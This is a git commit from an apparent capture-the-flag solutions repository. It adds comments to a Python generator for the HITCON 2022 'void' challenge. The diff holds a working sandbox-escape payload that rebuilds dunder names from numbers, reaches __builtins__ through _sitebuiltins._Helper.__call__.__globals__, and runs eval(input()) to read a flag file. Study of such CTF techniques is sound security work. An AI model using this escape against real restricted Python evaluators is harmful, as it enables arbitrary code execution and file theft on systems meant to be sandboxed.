a886c09fed376032b72be9ce1c78fb3c73bce7e5
braindead <braindead@localhost>
2022-12-09 21:34:34 +0200

    hitcon-2022: add comments to "void"

--- 2022/hitcon-2022/void/generate.py
+++ 2022/hitcon-2022/void/generate.py
@@ -57,17 +57,36 @@ if 1:
     resp = oracle(
         f'[] and ({npad}) or [] and (0/0+{cpad})'
         f'or ({n0}:=not[[]])or({n1}:=(not[])+{n0})and({n2}:={n1}+{n1})and({n4}:={n2}+{n2})and({n8}:={n4}+{n4})and({n16}:={n8}+{n8})and({n32}:={n16}+{n16})and({n64}:={n32}+{n32})'
-        #f'and {n8}'
+
+        # "values"
         f'and ({values}:=f"{{168}}"[{n8}+{n4}+{n1}:-{n2}])'
+
+        # "__dict__"
         f'and ({__dict__}:=796[{n0}]*{n2} + f"{{150}}"[{n8}:{n8}+{n4}] + 796[{n0}]*{n2})'
+
+        # "__class__"
         f'and ({__class__}:=796[{n0}]*{n2} + f"{{4}}"[{n1}:{n4}+{n2}] + 796[{n0}]*{n2})'
+
+        # object.__getattribute__
         f'and ({ga}:=(6).{__getattribute__})'
+
+        # _sitebuiltins._Helper
         f'and ({hlp}:=[*{ga}({ga}({ga}(6,{__class__}),{__dict__}),{values})()][{n8}](6)[-{n1}])'
+
+        # _sitebuiltins._Helper.__call__
         f'and ({fun}:=[*{ga}({ga}({hlp},{__dict__}),{values})()][-{n1}-{n2}])'
+
+        # _sitebuiltins._Helper.__call__.__globals__
         f'and ({__globals__}:=796[{n0}]*{n2} + 988[{lit(114)}:{lit(120)}] + 797[{n1}] + 796[{n0}]*{n2})'
+
+        # _sitebuiltins._Helper.__call__.__globals__['__builtins__']
         f'and ({sice}:=[*{ga}([*{ga}({ga}({fun},{__globals__}),{values})()][{n8}-{n1}],{values})()])'
+
+        # eval(input(), __builtins__ from _sitebuiltins._Helper)
+        # the second arg to eval is needed because the challenge trashed our own __builtins__
         f'and {sice}[{lit(19)}]({sice}[{lit(28)}](),{ga}({fun},{__globals__}))'
 
+        # input to input()
         + '\nprint(open("/home/ctf/flag").read())'
     )
     print(resp.decode().strip())
